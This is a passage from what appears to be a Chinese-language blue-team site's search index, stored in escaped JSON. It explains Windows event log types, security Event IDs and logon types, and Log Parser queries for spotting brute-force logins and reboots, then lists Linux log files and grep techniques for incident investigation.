Windows\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u7c7b\u65e5\u5fd7\u8bb0\u5f55\u7cfb\u7edf\u4e8b\u4ef6\uff1a\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u3001\u7cfb\u7edf\u65e5\u5fd7\u548c\u5b89\u5168\u65e5\u5fd7\u3002 \u7cfb\u7edf\u65e5\u5fd7 \u8bb0\u5f55\u64cd\u4f5c\u7cfb\u7edf\u7ec4\u4ef6\u4ea7\u751f\u7684\u4e8b\u4ef6\uff0c\u4e3b\u8981\u5305\u62ec\u9a71\u52a8\u7a0b\u5e8f\u3001\u7cfb\u7edf\u7ec4\u4ef6\u548c\u5e94\u7528\u8f6f\u4ef6\u7684\u5d29\u6e83\u4ee5\u53ca\u6570\u636e\u4e22\u5931\u9519\u8bef\u7b49\u3002\u7cfb\u7edf\u65e5\u5fd7\u4e2d\u8bb0\u5f55\u7684\u65f6\u95f4\u7c7b\u578b\u7531Windows\u2002NT/2000\u64cd\u4f5c\u7cfb\u7edf\u9884\u5148\u5b9a\u4e49\u3002 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx \u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7 \u5305\u542b\u7531\u5e94\u7528\u7a0b\u5e8f\u6216\u7cfb\u7edf\u7a0b\u5e8f\u8bb0\u5f55\u7684\u4e8b\u4ef6\uff0c\u4e3b\u8981\u8bb0\u5f55\u7a0b\u5e8f\u8fd0\u884c\u65b9\u9762\u7684\u4e8b\u4ef6\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u7a0b\u5e8f\u53ef\u4ee5\u5728\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u4e2d\u8bb0\u5f55\u6587\u4ef6\u9519\u8bef\uff0c\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u53ef\u4ee5\u81ea\u884c\u51b3\u5b9a\u76d1\u89c6\u54ea\u4e9b\u4e8b\u4ef6\u3002\u5982\u679c\u67d0\u4e2a\u5e94\u7528\u7a0b\u5e8f\u51fa\u73b0\u5d29\u6e83\u60c5\u51b5\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4ece\u7a0b\u5e8f\u4e8b\u4ef6\u65e5\u5fd7\u4e2d\u627e\u5230\u76f8\u5e94\u7684\u8bb0\u5f55\uff0c\u4e5f\u8bb8\u4f1a\u6709\u52a9\u4e8e\u4f60\u89e3\u51b3\u95ee\u9898\u3002 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx \u5b89\u5168\u65e5\u5fd7 \u8bb0\u5f55\u7cfb\u7edf\u7684\u5b89\u5168\u5ba1\u8ba1\u4e8b\u4ef6\uff0c\u5305\u542b\u5404\u79cd\u7c7b\u578b\u7684\u767b\u5f55\u65e5\u5fd7\u3001\u5bf9\u8c61\u8bbf\u95ee\u65e5\u5fd7\u3001\u8fdb\u7a0b\u8ffd\u8e2a\u65e5\u5fd7\u3001\u7279\u6743\u4f7f\u7528\u3001\u5e10\u53f7\u7ba1\u7406\u3001\u7b56\u7565\u53d8\u66f4\u3001\u7cfb\u7edf\u4e8b\u4ef6\u3002\u5b89\u5168\u65e5\u5fd7\u4e5f\u662f\u8c03\u67e5\u53d6\u8bc1\u4e2d\u6700\u5e38\u7528\u5230\u7684\u65e5\u5fd7\u3002\u9ed8\u8ba4\u8bbe\u7f6e\u4e0b\uff0c\u5b89\u5168\u6027\u65e5\u5fd7\u662f\u5173\u95ed\u7684\uff0c\u7ba1\u7406\u5458\u53ef\u4ee5\u4f7f\u7528\u7ec4\u7b56\u7565\u6765\u542f\u52a8\u5b89\u5168\u6027\u65e5\u5fd7\uff0c\u6216\u8005\u5728\u6ce8\u518c\u8868\u4e2d\u8bbe\u7f6e\u5ba1\u6838\u7b56\u7565\uff0c\u4ee5\u4fbf\u5f53\u5b89\u5168\u6027\u65e5\u5fd7\u6ee1\u540e\u4f7f\u7cfb\u7edf\u505c\u6b62\u54cd\u5e94\u3002 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx \u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u5b58\u50a8\u7740\u6545\u969c\u6392\u9664\u4fe1\u606f\uff0c\u5bf9\u4e8e\u7cfb\u7edf\u7ba1\u7406\u5458\u66f4\u4e3a\u6709\u7528\u3002 \u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55\u7740\u4e8b\u4ef6\u5ba1\u8ba1\u4fe1\u606f\uff0c\u5305\u62ec\u7528\u6237\u9a8c\u8bc1\uff08\u767b\u5f55\u3001\u8fdc\u7a0b\u8bbf\u95ee\u7b49\uff09\u548c\u7279\u5b9a\u7528\u6237\u5728\u8ba4\u8bc1\u540e\u5bf9\u7cfb\u7edf\u505a\u4e86\u4ec0\u4e48\uff0c\u5bf9\u4e8e\u8c03\u67e5\u4eba\u5458\u800c\u8a00\uff0c\u66f4\u6709\u5e2e\u52a9\u3002","title":"0x01 Window\u4e8b\u4ef6\u65e5\u5fd7\u7b80\u4ecb"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x02","text":"Windows Server 2008 R2 \u7cfb\u7edf\u7684\u5ba1\u6838\u529f\u80fd\u5728\u9ed8\u8ba4\u72b6\u6001\u4e0b\u5e76\u6ca1\u6709\u542f\u7528 \uff0c\u5efa\u8bae\u5f00\u542f\u5ba1\u6838\u7b56\u7565\uff0c\u82e5\u65e5\u540e\u7cfb\u7edf\u51fa\u73b0\u6545\u969c\u3001\u5b89\u5168\u4e8b\u6545\u5219\u53ef\u4ee5\u67e5\u770b\u7cfb\u7edf\u7684\u65e5\u5fd7\u6587\u4ef6\uff0c\u6392\u9664\u6545\u969c\uff0c\u8ffd\u67e5\u5165\u4fb5\u8005\u7684\u4fe1\u606f\u7b49\u3002 PS\uff1a\u9ed8\u8ba4\u72b6\u6001\u4e0b\uff0c\u4e5f\u4f1a\u8bb0\u5f55\u4e00\u4e9b\u7b80\u5355\u7684\u65e5\u5fd7\uff0c\u65e5\u5fd7\u9ed8\u8ba4\u5927\u5c0f20M \u8bbe\u7f6e1 \uff1a\u5f00\u59cb \u2192 \u7ba1\u7406\u5de5\u5177 \u2192 \u672c\u5730\u5b89\u5168\u7b56\u7565 \u2192 \u672c\u5730\u7b56\u7565 \u2192 \u5ba1\u6838\u7b56\u7565\uff0c\u53c2\u8003\u914d\u7f6e\u64cd\u4f5c\uff1a \u8bbe\u7f6e2 \uff1a\u8bbe\u7f6e\u5408\u7406\u7684\u65e5\u5fd7\u5c5e\u6027\uff0c\u5373\u65e5\u5fd7\u6700\u5927\u5927\u5c0f\u3001\u4e8b\u4ef6\u8986\u76d6\u9600\u503c\u7b49\uff1a \u67e5\u770b\u7cfb\u7edf\u65e5\u5fd7\u65b9\u6cd5\uff1a \u5728**\u201c\u5f00\u59cb\u201d \u83dc\u5355\u4e0a\uff0c\u4f9d\u6b21\u6307\u5411 \u201c\u6240\u6709\u7a0b\u5e8f\u201d \u3001 \u201c\u7ba1\u7406\u5de5\u5177\u201d \uff0c\u7136\u540e\u5355\u51fb \u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d** \u6309 \" Window+R \"\uff0c\u8f93\u5165 \u201d eventvwr.msc \u201c \u4e5f\u53ef\u4ee5\u76f4\u63a5\u8fdb\u5165\u201c \u4e8b\u4ef6\u67e5\u770b\u5668 \u201d","title":"0X02 \u5ba1\u6838\u7b56\u7565\u4e0e\u4e8b\u4ef6\u67e5\u770b\u5668"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x03","text":"\u5bf9\u4e8eWindows\u4e8b\u4ef6\u65e5\u5fd7\u5206\u6790\uff0c\u4e0d\u540c\u7684EVENT ID\u4ee3\u8868\u4e86\u4e0d\u540c\u7684\u610f\u4e49\uff0c\u6458\u5f55\u4e00\u4e9b\u5e38\u89c1\u7684\u5b89\u5168\u4e8b\u4ef6\u7684\u8bf4\u660e\uff1a \u4e8b\u4ef6ID \u8bf4\u660e 4624 \u767b\u5f55\u6210\u529f 4625 \u767b\u5f55\u5931\u8d25 4634 \u6ce8\u9500\u6210\u529f 4647 \u7528\u6237\u542f\u52a8\u7684\u6ce8\u9500 4672 \u4f7f\u7528\u8d85\u7ea7\u7528\u6237\uff08\u5982\u7ba1\u7406\u5458\uff09\u8fdb\u884c\u767b\u5f55 4720 \u521b\u5efa\u7528\u6237 \u6bcf\u4e2a\u6210\u529f\u767b\u5f55\u7684\u4e8b\u4ef6\u90fd\u4f1a\u6807\u8bb0\u4e00\u4e2a\u767b\u5f55\u7c7b\u578b\uff0c\u4e0d\u540c\u767b\u5f55\u7c7b\u578b\u4ee3\u8868\u4e0d\u540c\u7684\u65b9\u5f0f\uff1a \u767b\u5f55\u7c7b\u578b \u63cf\u8ff0 \u8bf4\u660e 2 \u4ea4\u4e92\u5f0f\u767b\u5f55\uff08Interactive\uff09 \u7528\u6237\u5728\u672c\u5730\u8fdb\u884c\u767b\u5f55\u3002 3 \u7f51\u7edc\uff08Network\uff09 \u6700\u5e38\u89c1\u7684\u60c5\u51b5\u5c31\u662f\u8fde\u63a5\u5230\u5171\u4eab\u6587\u4ef6\u5939\u6216\u5171\u4eab\u6253\u5370\u673a\u65f6\u3002 4 \u6279\u5904\u7406\uff08Batch\uff09 \u901a\u5e38\u8868\u660e\u67d0\u8ba1\u5212\u4efb\u52a1\u542f\u52a8\u3002 5 \u670d\u52a1\uff08Service\uff09 \u6bcf\u79cd\u670d\u52a1\u90fd\u88ab\u914d\u7f6e\u5728\u67d0\u4e2a\u7279\u5b9a\u7684\u7528\u6237\u8d26\u53f7\u4e0b\u8fd0\u884c\u3002 7 \u89e3\u9501\uff08Unlock\uff09 \u5c4f\u4fdd\u89e3\u9501\u3002 8 \u7f51\u7edc\u660e\u6587\uff08NetworkCleartext\uff09 \u767b\u5f55\u7684\u5bc6\u7801\u5728\u7f51\u7edc\u4e0a\u662f\u901a\u8fc7\u660e\u6587\u4f20\u8f93\u7684\uff0c\u5982FTP\u3002 9 \u65b0\u51ed\u8bc1\uff08NewCredentials\uff09 \u4f7f\u7528\u5e26/Netonly\u53c2\u6570\u7684RUNAS\u547d\u4ee4\u8fd0\u884c\u4e00\u4e2a\u7a0b\u5e8f\u3002 10 \u8fdc\u7a0b\u4ea4\u4e92\uff0c\uff08RemoteInteractive\uff09 \u901a\u8fc7\u7ec8\u7aef\u670d\u52a1\u3001\u8fdc\u7a0b\u684c\u9762\u6216\u8fdc\u7a0b\u534f\u52a9\u8bbf\u95ee\u8ba1\u7b97\u673a\u3002 11 \u7f13\u5b58\u4ea4\u4e92\uff08CachedInteractive\uff09 \u4ee5\u4e00\u4e2a\u57df\u7528\u6237\u767b\u5f55\u800c\u53c8\u6ca1\u6709\u57df\u63a7\u5236\u5668\u53ef\u7528 \u5173\u4e8e\u66f4\u591aEVENT ID\uff0c\u8be6\u89c1\u5fae\u8f6f\u5b98\u65b9\u7f51\u7ad9\u4e0a\u627e\u5230\u4e86\u201cWindows Vista \u548c Windows Server 2008 \u4e2d\u7684\u5b89\u5168\u4e8b\u4ef6\u7684\u8bf4\u660e\u201d\u3002 \u539f\u6587\u94fe\u63a5 \uff1a https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008 \u6848\u4f8b1\uff1a\u53ef\u4ee5\u5229\u7528eventlog\u4e8b\u4ef6\u6765\u67e5\u770b\u7cfb\u7edf\u8d26\u53f7\u767b\u5f55\u60c5\u51b5\uff1a \u5728**\u201c\u5f00\u59cb\u201d \u83dc\u5355\u4e0a\uff0c\u4f9d\u6b21\u6307\u5411 \u201c\u6240\u6709\u7a0b\u5e8f\u201d \u3001 \u201c\u7ba1\u7406\u5de5\u5177\u201d \uff0c\u7136\u540e\u5355\u51fb \u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d**\uff1b \u5728\u4e8b\u4ef6\u67e5\u770b\u5668\u4e2d\uff0c\u5355\u51fb**\u201c\u5b89\u5168\u201d**\uff0c\u67e5\u770b\u5b89\u5168\u65e5\u5fd7\uff1b \u5728\u5b89\u5168\u65e5\u5fd7\u53f3\u4fa7\u64cd\u4f5c\u4e2d\uff0c\u70b9\u51fb**\u201c\u7b5b\u9009\u5f53\u524d\u65e5\u5fd7\u201d**\uff0c\u8f93\u5165\u4e8b\u4ef6ID\u8fdb\u884c\u7b5b\u9009\u3002 4624 --\u767b\u5f55\u6210\u529f 4625 --\u767b\u5f55\u5931\u8d25 4634 -- \u6ce8\u9500\u6210\u529f 4647 -- \u7528\u6237\u542f\u52a8\u7684\u6ce8\u9500 4672 -- \u4f7f\u7528\u8d85\u7ea7\u7528\u6237\uff08\u5982\u7ba1\u7406\u5458\uff09\u8fdb\u884c\u767b\u5f55 \u6211\u4eec\u8f93\u5165\u4e8b\u4ef6ID\uff1a4625\u8fdb\u884c\u65e5\u5fd7\u7b5b\u9009\uff0c\u53d1\u73b0\u4e8b\u4ef6ID\uff1a4625\uff0c\u4e8b\u4ef6\u6570175904\uff0c\u5373\u7528\u6237\u767b\u5f55\u5931\u8d25\u4e86175904\u6b21\uff0c\u90a3\u4e48\u8fd9\u53f0\u670d\u52a1\u5668\u7ba1\u7406\u5458\u8d26\u53f7\u53ef\u80fd\u906d\u9047\u4e86\u66b4\u529b\u731c\u89e3\u3002 \u6848\u4f8b2\uff1a\u53ef\u4ee5\u5229\u7528eventlog\u4e8b\u4ef6\u6765\u67e5\u770b\u8ba1\u7b97\u673a\u5f00\u5173\u673a\u7684\u8bb0\u5f55\uff1a 1\u3001\u5728**\u201c\u5f00\u59cb\u201d \u83dc\u5355\u4e0a\uff0c\u4f9d\u6b21\u6307\u5411 \u201c\u6240\u6709\u7a0b\u5e8f\u201d \u3001 \u201c\u7ba1\u7406\u5de5\u5177\u201d \uff0c\u7136\u540e\u5355\u51fb \u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d**\uff1b 2\u3001\u5728\u4e8b\u4ef6\u67e5\u770b\u5668\u4e2d\uff0c\u5355\u51fb**\u201c\u7cfb\u7edf\u201d**\uff0c\u67e5\u770b\u7cfb\u7edf\u65e5\u5fd7\uff1b 3\u3001\u5728\u7cfb\u7edf\u65e5\u5fd7\u53f3\u4fa7\u64cd\u4f5c\u4e2d\uff0c\u70b9\u51fb**\u201c\u7b5b\u9009\u5f53\u524d\u65e5\u5fd7\u201d**\uff0c\u8f93\u5165\u4e8b\u4ef6ID\u8fdb\u884c\u7b5b\u9009\u3002 \u5176\u4e2d\u4e8b\u4ef6ID 6006 ID6005\u3001 ID 6009\u5c31\u8868\u793a\u4e0d\u540c\u72b6\u6001\u7684\u673a\u5668\u7684\u60c5\u51b5\uff08\u5f00\u5173\u673a\uff09\u3002 6005 \u4fe1\u606f EventLog \u4e8b\u4ef6\u65e5\u5fd7\u670d\u52a1\u5df2\u542f\u52a8\u3002(\u5f00\u673a) 6006 \u4fe1\u606f EventLog \u4e8b\u4ef6\u65e5\u5fd7\u670d\u52a1\u5df2\u505c\u6b62\u3002(\u5173\u673a) 6009 \u4fe1\u606f EventLog \u6309ctrl\u3001alt\u3001delete\u952e(\u975e\u6b63\u5e38)\u5173\u673a \u6211\u4eec\u8f93\u5165\u4e8b\u4ef6ID\uff1a6005-6006\u8fdb\u884c\u65e5\u5fd7\u7b5b\u9009\uff0c\u53d1\u73b0\u4e86\u4e24\u6761\u57282018/7/6 17:53:51\u5de6\u53f3\u7684\u8bb0\u5f55\uff0c\u4e5f\u5c31\u662f\u6211\u521a\u624d\u5bf9\u7cfb\u7edf\u8fdb\u884c\u91cd\u542f\u7684\u65f6\u95f4\u3002","title":"0x03 \u4e8b\u4ef6\u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x04","text":"","title":"0x04 \u65e5\u5fd7\u5206\u6790\u5de5\u5177"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#log-parser","text":"Log Parser\uff08\u662f\u5fae\u8f6f\u516c\u53f8\u51fa\u54c1\u7684\u65e5\u5fd7\u5206\u6790\u5de5\u5177\uff0c\u5b83\u529f\u80fd\u5f3a\u5927\uff0c\u4f7f\u7528\u7b80\u5355\uff0c\u53ef\u4ee5\u5206\u6790\u57fa\u4e8e\u6587\u672c\u7684\u65e5\u5fd7\u6587\u4ef6\u3001XML \u6587\u4ef6\u3001CSV\uff08\u9017\u53f7\u5206\u9694\u7b26\uff09\u6587\u4ef6\uff0c\u4ee5\u53ca\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e8b\u4ef6\u65e5\u5fd7\u3001\u6ce8\u518c\u8868\u3001\u6587\u4ef6\u7cfb\u7edf\u3001Active Directory\u3002\u5b83\u53ef\u4ee5\u50cf\u4f7f\u7528 SQL \u8bed\u53e5\u4e00\u6837\u67e5\u8be2\u5206\u6790\u8fd9\u4e9b\u6570\u636e\uff0c\u751a\u81f3\u53ef\u4ee5\u628a\u5206\u6790\u7ed3\u679c\u4ee5\u5404\u79cd\u56fe\u8868\u7684\u5f62\u5f0f\u5c55\u73b0\u51fa\u6765\u3002 Log Parser 2.2\u4e0b\u8f7d\u5730\u5740\uff1a https://www.microsoft.com/en-us/download/details.aspx?id=24659 Log Parser \u4f7f\u7528\u793a\u4f8b\uff1a https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/ \u57fa\u672c\u67e5\u8be2\u7ed3\u6784 Logparser.exe \u2013i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\xx.evtx\" \u4f7f\u7528Log Parser\u5206\u6790\u65e5\u5fd7 1\u3001\u67e5\u8be2\u767b\u5f55\u6210\u529f\u7684\u4e8b\u4ef6 \u767b\u5f55\u6210\u529f\u7684\u6240\u6709\u4e8b\u4ef6 LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4624\" \u6307\u5b9a\u767b\u5f55\u65f6\u95f4\u8303\u56f4\u7684\u4e8b\u4ef6\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\Security.evtx where TimeGenerated>'2018-06-19 23:32:11' and TimeGenerated<'2018-06-20 23:34:00' and EventID=4624\" \u63d0\u53d6\u767b\u5f55\u6210\u529f\u7684\u7528\u6237\u540d\u548cIP\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\\Security.evtx where EventID=4624\" 2\u3001\u67e5\u8be2\u767b\u5f55\u5931\u8d25\u7684\u4e8b\u4ef6 \u767b\u5f55\u5931\u8d25\u7684\u6240\u6709\u4e8b\u4ef6\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4625\" \u63d0\u53d6\u767b\u5f55\u5931\u8d25\u7528\u6237\u540d\u8fdb\u884c\u805a\u5408\u7edf\u8ba1\uff1a LogParser.exe -i:EVT \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\\Security.evtx where EventID=4625 GROUP BY Message\" 3\u3001\u7cfb\u7edf\u5386\u53f2\u5f00\u5173\u673a\u8bb0\u5f55\uff1a LogParser.exe -i:EVT \u2013o:DATAGRID \"SELECT TimeGenerated,EventID,Message FROM c:\\System.evtx where EventID=6005 or EventID=6006\"","title":"Log Parser"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#logparser-lizard","text":"\u5bf9\u4e8eGUI\u73af\u5883\u7684Log Parser Lizard\uff0c\u5176\u7279\u70b9\u662f\u6bd4\u8f83\u6613\u4e8e\u4f7f\u7528\uff0c\u751a\u81f3\u4e0d\u9700\u8981\u8bb0\u5fc6\u7e41\u7410\u7684\u547d\u4ee4\uff0c\u53ea\u9700\u8981\u505a\u597d\u8bbe\u7f6e\uff0c\u5199\u597d\u57fa\u672c\u7684SQL\u8bed\u53e5\uff0c\u5c31\u53ef\u4ee5\u76f4\u89c2\u7684\u5f97\u5230\u7ed3\u679c\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a http://www.lizard-labs.com/log_parser_lizard.aspx \u4f9d\u8d56\u5305\uff1aMicrosoft .NET Framework 4 .5\uff0c\u4e0b\u8f7d\u5730\u5740\uff1a https://www.microsoft.com/en-us/download/details.aspx?id=42642 \u67e5\u8be2\u6700\u8fd1\u7528\u6237\u767b\u5f55\u60c5\u51b5\uff1a","title":"LogParser Lizard"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#event-log-explorer","text":"Event Log Explorer\u662f\u4e00\u6b3e\u975e\u5e38\u597d\u7528\u7684Windows\u65e5\u5fd7\u5206\u6790\u5de5\u5177\u3002\u53ef\u7528\u4e8e\u67e5\u770b\uff0c\u76d1\u89c6\u548c\u5206\u6790\u8ddf\u4e8b\u4ef6\u8bb0\u5f55\uff0c\u5305\u62ec\u5b89\u5168\uff0c\u7cfb\u7edf\uff0c\u5e94\u7528\u7a0b\u5e8f\u548c\u5176\u4ed6\u5fae\u8f6fWindows \u7684\u8bb0\u5f55\u88ab\u8bb0\u8f7d\u7684\u4e8b\u4ef6\uff0c\u5176\u5f3a\u5927\u7684\u8fc7\u6ee4\u529f\u80fd\u53ef\u4ee5\u5feb\u901f\u7684\u8fc7\u6ee4\u51fa\u6709\u4ef7\u503c\u7684\u4fe1\u606f\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a https://event-log-explorer.en.softonic.com/ \u53c2\u8003\u94fe\u63a5\uff1a Windows\u65e5\u5fd7\u5206\u6790 https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ","title":"Event Log Explorer"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#2linux","text":"","title":"\u7b2c2\u7bc7:Linux\u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x00","text":"Linux\u7cfb\u7edf\u62e5\u6709\u975e\u5e38\u7075\u6d3b\u548c\u5f3a\u5927\u7684\u65e5\u5fd7\u529f\u80fd\uff0c\u53ef\u4ee5\u4fdd\u5b58\u51e0\u4e4e\u6240\u6709\u7684\u64cd\u4f5c\u8bb0\u5f55\uff0c\u5e76\u53ef\u4ee5\u4ece\u4e2d\u68c0\u7d22\u51fa\u6211\u4eec\u9700\u8981\u7684\u4fe1\u606f\u3002 \u672c\u6587\u7b80\u4ecb\u4e00\u4e0bLinux\u7cfb\u7edf\u65e5\u5fd7\u53ca\u65e5\u5fd7\u5206\u6790\u6280\u5de7\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x01","text":"\u65e5\u5fd7\u9ed8\u8ba4\u5b58\u653e\u4f4d\u7f6e\uff1a/var/log/ \u67e5\u770b\u65e5\u5fd7\u914d\u7f6e\u60c5\u51b5\uff1amore /etc/rsyslog.conf \u65e5\u5fd7\u6587\u4ef6 \u8bf4\u660e /var/log/cron \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5b9a\u65f6\u4efb\u52a1\u76f8\u5173\u7684\u65e5\u5fd7 /var/log/cups \u8bb0\u5f55\u6253\u5370\u4fe1\u606f\u7684\u65e5\u5fd7 /var/log/dmesg \u8bb0\u5f55\u4e86\u7cfb\u7edf\u5728\u5f00\u673a\u65f6\u5185\u6838\u81ea\u68c0\u7684\u4fe1\u606f\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528dmesg\u547d\u4ee4\u76f4\u63a5\u67e5\u770b\u5185\u6838\u81ea\u68c0\u4fe1\u606f /var/log/mailog \u8bb0\u5f55\u90ae\u4ef6\u4fe1\u606f /var/log/message \u8bb0\u5f55\u7cfb\u7edf\u91cd\u8981\u4fe1\u606f\u7684\u65e5\u5fd7\u3002\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d\u4f1a\u8bb0\u5f55Linux\u7cfb\u7edf\u7684\u7edd\u5927\u591a\u6570\u91cd\u8981\u4fe1\u606f\uff0c\u5982\u679c\u7cfb\u7edf\u51fa\u73b0\u95ee\u9898\u65f6\uff0c\u9996\u5148\u8981\u68c0\u67e5\u7684\u5c31\u5e94\u8be5\u662f\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6 /var/log/btmp \u8bb0\u5f55\u9519\u8bef\u767b\u5f55\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\u67e5\u770b\uff0c\u800c\u8981\u4f7f\u7528lastb\u547d\u4ee4\u67e5\u770b /var/log/lastlog \u8bb0\u5f55\u7cfb\u7edf\u4e2d\u6240\u6709\u7528\u6237\u6700\u540e\u4e00\u6b21\u767b\u5f55\u65f6\u95f4\u7684\u65e5\u5fd7\uff0c\u8fd9\u4e2a\u6587\u4ef6\u662f\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528lastlog\u547d\u4ee4\u67e5\u770b /var/log/wtmp \u6c38\u4e45\u8bb0\u5f55\u6240\u6709\u7528\u6237\u7684\u767b\u5f55\u3001\u6ce8\u9500\u4fe1\u606f\uff0c\u540c\u65f6\u8bb0\u5f55\u7cfb\u7edf\u7684\u542f\u52a8\u3001\u91cd\u542f\u3001\u5173\u673a\u4e8b\u4ef6\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e5f\u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u9700\u8981\u4f7f\u7528last\u547d\u4ee4\u6765\u67e5\u770b /var/log/utmp \u8bb0\u5f55\u5f53\u524d\u5df2\u7ecf\u767b\u5f55\u7684\u7528\u6237\u4fe1\u606f\uff0c\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u968f\u7740\u7528\u6237\u7684\u767b\u5f55\u548c\u6ce8\u9500\u4e0d\u65ad\u53d8\u5316\uff0c\u53ea\u8bb0\u5f55\u5f53\u524d\u767b\u5f55\u7528\u6237\u7684\u4fe1\u606f\u3002\u540c\u6837\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u80fd\u76f4\u63a5vi\uff0c\u800c\u8981\u4f7f\u7528w,who,users\u7b49\u547d\u4ee4\u6765\u67e5\u8be2 /var/log/secure \u8bb0\u5f55\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\uff0c\u6bd4\u5982SSH\u767b\u5f55\uff0csu\u5207\u6362\u7528\u6237\uff0csudo\u6388\u6743\uff0c\u751a\u81f3\u6dfb\u52a0\u7528\u6237\u548c\u4fee\u6539\u7528\u6237\u5bc6\u7801\u90fd\u4f1a\u8bb0\u5f55\u5728\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u4e2d \u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u65e5\u5fd7\uff1a \u767b\u5f55\u5931\u8d25\u8bb0\u5f55\uff1a/var/log/btmp //lastb \u6700\u540e\u4e00\u6b21\u767b\u5f55\uff1a/var/log/lastlog //lastlog \u767b\u5f55\u6210\u529f\u8bb0\u5f55: /var/log/wtmp //last \u767b\u5f55\u65e5\u5fd7\u8bb0\u5f55\uff1a/var/log/secure \u76ee\u524d\u767b\u5f55\u7528\u6237\u4fe1\u606f\uff1a/var/run/utmp //w\u3001who\u3001users \u5386\u53f2\u547d\u4ee4\u8bb0\u5f55\uff1ahistory \u4ec5\u6e05\u7406\u5f53\u524d\u7528\u6237\uff1a history -c","title":"0x01 \u65e5\u5fd7\u7b80\u4ecb"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x02_1","text":"","title":"0x02 \u65e5\u5fd7\u5206\u6790\u6280\u5de7"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#ashell","text":"Linux\u4e0b\u5e38\u7528\u7684shell\u547d\u4ee4\u5982\uff1afind\u3001grep \u3001egrep\u3001awk\u3001sed \u5c0f\u6280\u5de7\uff1a 1\u3001grep\u663e\u793a\u524d\u540e\u51e0\u884c\u4fe1\u606f: \u6807\u51c6unix/linux\u4e0b\u7684grep\u901a\u8fc7\u4e0b\u9762\u53c3\u6570\u63a7\u5236\u4e0a\u4e0b\u6587\uff1a grep -C 5 foo file \u663e\u793afile\u6587\u4ef6\u91cc\u5339\u914dfoo\u5b57\u4e32\u90a3\u884c\u4ee5\u53ca\u4e0a\u4e0b5\u884c grep -B 5 foo file \u663e\u793afoo\u53ca\u524d5\u884c grep -A 5 foo file \u663e\u793afoo\u53ca\u540e5\u884c \u67e5\u770bgrep\u7248\u672c\u53f7\u7684\u65b9\u6cd5\u662f grep -V 2\u3001grep 